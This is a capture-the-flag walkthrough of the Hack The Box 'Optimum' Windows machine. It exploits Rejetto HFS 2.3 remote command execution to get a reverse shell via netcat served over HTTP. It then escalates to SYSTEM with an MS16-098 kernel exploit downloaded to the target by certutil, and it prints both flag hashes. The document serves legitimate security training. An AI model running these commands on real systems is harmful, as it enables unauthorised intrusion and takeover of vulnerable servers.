![Optimum.PNG](/assets/Machines/Easy/Optimum/Optimum.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.8
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.8
```

**Output**
```bash
PORT   STATE SERVICE
80/tcp open  http
```

3. Visit web page

![web.PNG](/assets/Machines/Easy/Optimum/web.PNG)

4. Search exploit with leak information `HttpFileServer 2.3`
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Optimum]
└─| searchsploit httpfileserver 2.3
```

**Output**
```bash
----------------------------------------------------------------------------------------------------- 
 Exploit Title                                                           |  Path
----------------------------------------------------------------------------------------------------- 
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution(2)       | windows/remote/39161.py
-----------------------------------------------------------------------------------------------------
```

### **searchsploit basic use**
| Command | Meaning |
|:-------:|:-------:|
| `searchsploit <To search>` | Search any exploit with a previous description |
| `searchsploit -m <Path Exploit>` | Move the exploit choosed in current directory |
| `searchsploit -x <Path Exploit>` | Examine the exploit choosed (View content) |


5. You need change this lines of code in previous exploit **.py**
```python
ip_addr = "<Tun0 IP>" #local IP address
local_port = "443" #Port choosen by you
```

Second, analyze script and you will find this comment
```python
#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).
#You may need to run it multiple times for success!
```

* We need to create a server and provide **nc.exe** program to execute a reverse shell

* First, download [nc.exe](https://eternallybored.org/misc/netcat/).
* Second, create a http server with python in same folder of **nc.exe**

6. Execute exploit multiple times (Remember listen on port chosen with nc)

* `nc listen`
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Optimum]
└─| rlwrap nc -lvnp 443
listening on [any] 443 ...
```
---
* `Http Server with python`
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Optimum]
└─| python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
---
* `Run script`
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Optimum]
└─| python2 39161.py <Machine's Ip> <Port> 
```

**Output**
```cmd
C:\Users\kostas\Desktop>whoami
whoami
optimum\kostas
```

7. Show **user flag**

```cmd
C:\Users\kostas\Desktop>type user.txt
type user.txt
799da248bef4fc89a6970bfb1a679920
```


---
---
---
### **Privileges Escalation** 💀

1. In this case we use `Windows Exploit Suggester`, download for this [repository](https://github.com/gr33nm0nk2802/Windows-Exploit-Suggester)

* First, you run this
```bash
┌──(root㉿kali)-[/home/…/Machines/Easy/Optimum/Windows-Exploit-Suggester-python3]
└─| ./windows-exploit-suggester.py --update 
```

* Then, list sysinfo in target machine

```cmd
C:\Users\kostas\Desktop>systeminfo
systeminfo

Host Name:                OPTIMUM
OS Name:                  Microsoft Windows Server 2012 R2 Standard
OS Version:               6.3.9600 N/A Build 9600
OS Manufacturer:          Microsoft Corporation
OS Configuration:         Standalone Server
OS Build Type:            Multiprocessor Free
Registered Owner:         Windows User
Registered Organization:   
...
```
* Copy this information and put into a file in our machine.

* Next, when first command are finish use **.xlsx** file to discover ways to escalate privileges

```bash
┌──(root㉿kali)-[/home/…/Machines/Easy/Optimum/Windows-Exploit-Suggester-python3]
└─| ./windows-exploit-suggester.py --database 2022-12-30-mssb.xlsx --systeminfo systeminfo.txt
```

**Output**
```bash
...
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*] https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)                 
[*] 
...
```
* In output you will fins many ways to escalate privileges, try with previous way.


2. Visit https://www.exploit-db.com/exploits/41020/

![search.PNG](/assets/Machines/Easy/Optimum/search.PNG)

* Download binary from this link

3. Download binary in target machine, to do this you need to create a http server in same folder of previous binary

* `Http Server with python`
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Optimum]
└─| python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

* `Download binary in target machine`
```bash
C:\Windows\Temp>certutil.exe -f -urlcache -split http://<Tun0 IP>/exploit.exe
```

4. Now, run **.exe**
```cmd
C:\Users\kostas\Desktop>.\exploit.exe
.\exploit.exe
```


**Output**
```cmd
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\kostas\Desktop>whoami
whoami
nt authority\system
```

* We are in the group authority (Administrator)

5. Show **root flag**
```bash
C:\Users\Administrator\Desktop>type root.txt
type root.txt
4fc07a2f0d9ae4877c6bfc0aa2fd64e4
```